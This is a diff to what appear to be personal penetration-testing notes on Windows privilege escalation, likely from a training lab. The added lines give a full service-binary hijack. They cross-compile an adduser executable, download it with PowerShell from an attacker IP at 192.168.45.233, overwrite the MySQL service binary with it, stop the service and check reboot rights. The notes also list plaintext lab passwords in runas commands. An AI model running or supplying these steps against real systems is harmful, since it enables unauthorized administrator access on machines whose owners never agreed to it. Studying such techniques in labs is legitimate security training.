@@ -40,9 +40,17 @@ When you gain access to a windows user do steps bellow:
 
       Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'} #enumerate running service
       icacls "C:\xampp\mysql\bin\mysqld.exe" #to verify if we have permission to do the substitution of file
+      x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+      iwr -uri http://192.168.45.233:8000/adduser.exe -Outfile adduser.exe 
+      move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
+      move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
+      net stop mysql # try stop mysql service
+      Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}  #to verify start mode of the service
+      whoami /priv #to check if current user has permission to reboot the system
 
 runas /user:"richmond" "powershell -ep bypass"   # GothicLifeStyle1337!
 runas /user:"daveadmin" "powershell -ep bypass"   # qwertqwertqwert123!!
+runas /user:"dave2" "powershell -ep bypass" # password123!
 
 #powershell login
 $password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
